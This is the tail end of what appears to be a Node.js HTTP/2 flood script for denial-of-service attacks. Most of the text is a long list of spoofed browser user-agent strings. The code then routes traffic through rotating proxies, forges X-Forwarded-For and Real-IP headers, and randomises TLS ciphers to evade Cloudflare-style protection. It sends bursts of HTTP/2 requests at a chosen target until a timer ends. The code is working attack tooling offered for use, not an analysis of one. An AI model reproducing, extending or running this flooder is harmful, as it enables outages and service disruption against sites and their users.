	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6; MSIECrawler)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6; Hotbar 4.2.8.0)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6; Hotbar 3.0)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.4)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.0.0; Hotbar 4.1.8.0)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.0.0)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Wanadoo 5.6)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Wanadoo 5.3; Wanadoo 5.5)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Wanadoo 5.1)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; SV1; .NET CLR 1.1.4322; .NET CLR 1.0.3705; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; SV1)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Q312461; T312461)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Q312461)",
	"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; MSIECrawler)",
	"More Internet Explorer 5.01 user agents strings -->>",
	"Mozilla/4.0 (compatible; MSIE 5.0b1; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.00; Windows 98)",
	"Mozilla/4.0(compatible; MSIE 5.0; Windows 98; DigExt)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT;)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; YComp 5.0.2.6)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; YComp 5.0.2.5)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; YComp 5.0.0.0)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; Hotbar 4.1.8.0)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; Hotbar 3.0)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; .NET CLR 1.0.3705)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 6.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.0.04506.648; .NET4.0C; .NET4.0E)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.9; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.2; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.0)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98;)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; YComp 5.0.2.4)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; Hotbar 3.0)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt; YComp 5.0.2.6; yplus 1.0)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt; YComp 5.0.2.6)",
	"More Internet Explorer 5.0 user agents strings -->>",
	"Mozilla/4.0 (compatible; MSIE 4.5; Windows NT 5.1; .NET CLR 2.0.40607)",
	"Mozilla/4.0 (compatible; MSIE 4.5; Windows 98; )",
	"Mozilla/4.0 (compatible; MSIE 4.5; Mac_PowerPC)",
	" Mozilla/4.0 (compatible; MSIE 4.5; Mac_PowerPC)",
	"Mozilla/4.0 PPC (compatible; MSIE 4.01; Windows CE; PPC; 240x320; Sprint:PPC-6700; PPC; 240x320)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows NT 5.0)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint;PPC-i830; PPC; 240x320)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint; SCH-i830; PPC; 240x320)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SPH-ip830w; PPC; 240x320)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SPH-ip320; Smartphone; 176x220)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SCH-i830; PPC; 240x320)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SCH-i320; Smartphone; 176x220)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:PPC-i830; PPC; 240x320)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone; 176x220)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320; Sprint:PPC-6700; PPC; 240x320)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320; PPC)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows 98; Hotbar 3.0)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows 98; DigExt)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Mac_PowerPC)",
	"More Internet Explorer 4.01 user agents strings -->>",
	"Mozilla/4.0 WebTV/2.6 (compatible; MSIE 4.0)",
	"Mozilla/4.0 (compatible; MSIE 4.0; Windows NT)",
	"Mozilla/4.0 (compatible; MSIE 4.0; Windows 98 )",
	"Mozilla/4.0 (compatible; MSIE 4.0; Windows 95; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (compatible; MSIE 4.0; Windows 95)",
	"Mozilla/4.0 (Compatible; MSIE 4.0)",
	"Mozilla/2.0 (compatible; MSIE 4.0; Windows 98)",
	"Mozilla/2.0 (compatible; MSIE 3.03; Windows 3.1)",
	"Mozilla/2.0 (compatible; MSIE 3.02; Windows 3.1)",
	"Mozilla/2.0 (compatible; MSIE 3.01; Windows 95)",
	" Mozilla/2.0 (compatible; MSIE 3.01; Windows 95)",
	"Mozilla/2.0 (compatible; MSIE 3.0B; Windows NT)",
	"Mozilla/3.0 (compatible; MSIE 3.0; Windows NT 5.0)",
	"Mozilla/2.0 (compatible; MSIE 3.0; Windows 95)",
	"Mozilla/2.0 (compatible; MSIE 3.0; Windows 3.1)",
	"Mozilla/4.0 (compatible; MSIE 2.0; Windows NT 5.0; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
	"Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)",
	"Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)",
	"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
	"Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
	"Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
	"Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
	"Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
	"Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
	"Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
	"Opera/12.0(Windows NT 5.1;U;en)Presto/22.9.168 Version/12.00",
	"Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0",
	"Opera/9.80 (Windows NT 6.1; WOW64; U; pt) Presto/2.10.229 Version/11.62",
	"Opera/9.80 (Windows NT 6.0; U; pl) Presto/2.10.229 Version/11.62",
	"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
	"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; de) Presto/2.9.168 Version/11.52",
	"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.9.168 Version/11.51",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; de) Opera 11.51",
	"Opera/9.80 (X11; Linux x86_64; U; fr) Presto/2.9.168 Version/11.50",
	"Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50",
	"Opera/9.80 (X11; Linux i686; U; ru) Presto/2.8.131 Version/11.11",
	"Opera/9.80 (X11; Linux i686; U; es-ES) Presto/2.8.131 Version/11.11",
	"Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/5.0 Opera 11.11",
	"Opera/9.80 (X11; Linux x86_64; U; bg) Presto/2.8.131 Version/11.10",
	"Opera/9.80 (Windows NT 6.0; U; en) Presto/2.8.99 Version/11.10",
	"Opera/9.80 (Windows NT 5.1; U; zh-tw) Presto/2.8.131 Version/11.10",
	"Opera/9.80 (Windows NT 6.1; Opera Tablet/15165; U; en) Presto/2.8.149 Version/11.1",
	"Opera/9.80 (X11; Linux x86_64; U; Ubuntu/10.10 (maverick); pl) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (X11; Linux i686; U; ja) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (X11; Linux i686; U; fr) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (Windows NT 6.1; U; sv) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (Windows NT 6.1; U; en-US) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (Windows NT 6.1; U; cs) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (Windows NT 6.0; U; pl) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.7.62 Version/11.01",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101213 Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Vers",
	"Mozilla/5.0 (Windows NT 6.1; U; nl; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.01",
	"Mozilla/5.0 (Windows NT 6.1; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.01",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01",
	"Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00",
	"Opera/9.80 (X11; Linux i686; U; it) Presto/2.7.62 Version/11.00",
	"Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.6.37 Version/11.00",
	"Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.7.62 Version/11.00",
	"Opera/9.80 (Windows NT 6.1; U; ko) Presto/2.7.62 Version/11.00",
	"Opera/9.80 (Windows NT 6.1; U; fi) Presto/2.7.62 Version/11.00",
	"Opera/9.80 (Windows NT 6.1; U; en-GB) Presto/2.7.62 Version/11.00",
	"Opera/9.80 (Windows NT 6.1 x64; U; en) Presto/2.7.62 Version/11.00",
	"Opera/9.80 (Windows NT 6.0; U; en) Presto/2.7.39 Version/11.00",
	"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.7.39 Version/11.00",
	"Opera/9.80 (Windows NT 5.1; U; MRA 5.5 (build 02842); ru) Presto/2.7.62 Version/11.00",
	"Opera/9.80 (Windows NT 5.1; U; it) Presto/2.7.62 Version/11.00",
	"Mozilla/5.0 (Windows NT 6.0; U; ja; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
	"Mozilla/5.0 (Windows NT 5.1; U; pl; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
	"Mozilla/5.0 (Windows NT 5.1; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
	"Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.6.31 Version/10.70",
	"Mozilla/5.0 (Windows NT 5.2; U; ru; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.70",
	"Mozilla/5.0 (Windows NT 5.1; U; zh-cn; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.70",
	"Opera/9.80 (Windows NT 5.2; U; zh-cn) Presto/2.6.30 Version/10.63",
	"Opera/9.80 (Windows NT 5.2; U; en) Presto/2.6.30 Version/10.63",
	"Opera/9.80 (Windows NT 5.1; U; MRA 5.6 (build 03278); ru) Presto/2.6.30 Version/10.63",
	"Opera/9.80 (Windows NT 5.1; U; pl) Presto/2.6.30 Version/10.62",
	"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62",
	"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; de) Opera 10.62",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; en) Opera 10.62",
	"Opera/9.80 (X11; Linux i686; U; pl) Presto/2.6.30 Version/10.61",
	"Opera/9.80 (X11; Linux i686; U; es-ES) Presto/2.6.30 Version/10.61",
	"Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.6.30 Version/10.61",
	"Opera/9.80 (Windows NT 6.1; U; en) Presto/2.6.30 Version/10.61",
	"Opera/9.80 (Windows NT 6.0; U; it) Presto/2.6.30 Version/10.61",
	"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.6.30 Version/10.61",
	"Opera/9.80 (Windows 98; U; de) Presto/2.6.30 Version/10.61",
	"Opera/9.80 (Macintosh; Intel Mac OS X; U; nl) Presto/2.6.30 Version/10.61",
	"Opera/9.80 (X11; Linux i686; U; en) Presto/2.5.27 Version/10.60",
	"Opera/9.80 (Windows NT 6.0; U; nl) Presto/2.6.30 Version/10.60",
	"Opera/10.60 (Windows NT 5.1; U; zh-cn) Presto/2.6.30 Version/10.60",
	"Opera/10.60 (Windows NT 5.1; U; en-US) Presto/2.6.30 Version/10.60",
	"Opera/9.80 (X11; Linux i686; U; it) Presto/2.5.24 Version/10.54",
	"Opera/9.80 (X11; Linux i686; U; en-GB) Presto/2.5.24 Version/10.53",
	"Mozilla/5.0 (Windows NT 5.1; U; zh-cn; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
	"Mozilla/5.0 (Windows NT 5.1; U; Firefox/5.0; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
	"Mozilla/5.0 (Windows NT 5.1; U; Firefox/4.5; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
	"Mozilla/5.0 (Windows NT 5.1; U; Firefox/3.5; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; ko) Opera 10.53",
	"Opera/9.80 (Windows NT 6.1; U; fr) Presto/2.5.24 Version/10.52",
	"Opera/9.80 (Windows NT 6.1; U; en) Presto/2.5.22 Version/10.51",
	"Opera/9.80 (Windows NT 6.0; U; cs) Presto/2.5.22 Version/10.51",
	"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
	"Opera/9.80 (Linux i686; U; en) Presto/2.5.22 Version/10.51",
	"Mozilla/5.0 (Windows NT 6.1; U; en-GB; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.51",
	"Mozilla/5.0 (Linux i686; U; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.51",
	"Mozilla/4.0 (compatible; MSIE 8.0; Linux i686; en) Opera 10.51",
	"Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.5.22 Version/10.50",
	"Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.5.22 Version/10.50",
	"Opera/9.80 (Windows NT 6.1; U; sk) Presto/2.6.22 Version/10.50",
	"Opera/9.80 (Windows NT 6.1; U; ja) Presto/2.5.22 Version/10.50",
	"Opera/9.80 (Windows NT 6.0; U; zh-cn) Presto/2.5.22 Version/10.50",
	"Opera/9.80 (Windows NT 5.1; U; sk) Presto/2.5.22 Version/10.50",
	"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.5.22 Version/10.50",
	"Opera/10.50 (Windows NT 6.1; U; en-GB) Presto/2.2.2",
	"Opera/9.80 (S60; SymbOS; Opera Tablet/9174; U; en) Presto/2.7.81 Version/10.5",
	"Opera/9.80 (X11; U; Linux i686; en-US; rv:1.9.2.3) Presto/2.2.15 Version/10.10",
	"Opera/9.80 (X11; Linux x86_64; U; it) Presto/2.2.15 Version/10.10",
	"Opera/9.80 (Windows NT 6.1; U; de) Presto/2.2.15 Version/10.10",
	"Opera/9.80 (Windows NT 6.0; U; Gecko/20100115; pl) Presto/2.2.15 Version/10.10",
	"Opera/9.80 (Windows NT 6.0; U; en) Presto/2.2.15 Version/10.10",
	"Opera/9.80 (Windows NT 5.1; U; de) Presto/2.2.15 Version/10.10",
	"Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.2.15 Version/10.10",
	"Mozilla/5.0 (Windows NT 6.0; U; tr; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 10.10",
	"Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; de) Opera 10.10",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 6.0; tr) Opera 10.10",
	"Opera/9.80 (X11; Linux x86_64; U; en-GB) Presto/2.2.15 Version/10.01",
 ];

 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
 var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
 var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
 var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
 var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var pi = platform[Math.floor(Math.floor(Math.random() * platform.length))]
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);
 
      if (cluster.isMaster) {
        for (let counter = 1; counter <= args.threads; counter++) {
          cluster.fork();
        }
      } else {
        setInterval(runFlooder);
      };
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port
     });
 
     //connection.setTimeout(options.timeout * 600000);
     connection.setTimeout(options.timeout * 100000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }

 const Socker = new NetSocket();
 headers[":method"] = "GET";
 headers[":authority"] = parsedTarget.host;
 headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
 headers[":scheme"] = "https";
 headers["x-forwarded-proto"] = "https";
 headers["accept-language"] = lang;
 headers["accept-encoding"] = encoding;
 headers["X-Forwarded-For"] = spoofed;
 headers["X-Forwarded-Host"] = spoofed;
 headers["Real-IP"] = spoofed;
 headers["cache-control"] = control;
 headers["sec-ch-ua"] = '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"';
 headers["sec-ch-ua-mobile"] = "?0";
 headers["sec-ch-ua-platform"] = pi;
 //headers["origin"] = "https://" + parsedTarget.host;
 headers["referer"] = Ref;
 headers["upgrade-insecure-requests"] = "1";
 headers["accept"] = accept;
 headers["user-agent"] = uap1;
 headers["Alt-Svc"] = "http/1.1=http2." + parsedTarget.host + "; ma=72000";
 headers["Access-Control-Request-Method"] = "GET";
 headers["sec-fetch-dest"] = "document";
 headers["Accept-CH"] = "width";
 headers["Sec-CH-UA-Platform-Version"] = "11.0.0";
 headers["sec-fetch-mode"] = "navigate";
 headers["sec-fetch-site"] = "none";
 headers["TE"] = "trailers";
 headers["Clear-Site-Data"] = "cache","cookies";
 headers["Max-Forwards"] = "10";
 //headers["Trailer"] = "Max-Forwards";
 headers["sec-fetch-user"] = "?1";
 headers["x-requested-with"] = "XMLHttpRequest";
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":"); 
	 //headers[":authority"] = parsedTarget.host;
         headers["referer"] = "https://" + parsedTarget.host + "/?" + randstr(15);
         headers["origin"] = "https://" + parsedTarget.host;

     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 100,
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 600000);

         const tlsOptions = {
            host: parsedTarget.host,
            port: 443,
            challengesToSolve: Infinity,
            resolveWithFullResponse: true,
            followAllRedirects: true,
            maxRedirects: 10,
            clientTimeout: 5000,
            clientlareMaxTimeout: 10000,
            cloudflareTimeout: 5000,
            cloudflareMaxTimeout: 30000,
            secure: true,
            ALPNProtocols: ['h2'],
            sigals: siga,
            socket: connection,
            ciphers: tls.getCiphers().join(":") + cipper,
            ecdhCurve: "prime256v1:X25519",
            host: parsedTarget.host,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            secureProtocol: "TLS_method",
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 60000);

         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 2000,
            initialWindowSize: 65535,
            maxHeaderListSize: 65536,
            enablePush: false
          },
             maxSessionMemory: 64000,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 2000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 65536,
            enablePush: false
          });
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    //headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
                    const request = client.request(headers)
                    
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
     }),function (error, response, body) {
		};
 }
 const KillScript = () => process.exit(1);
 setTimeout(KillScript, args.time * 1000);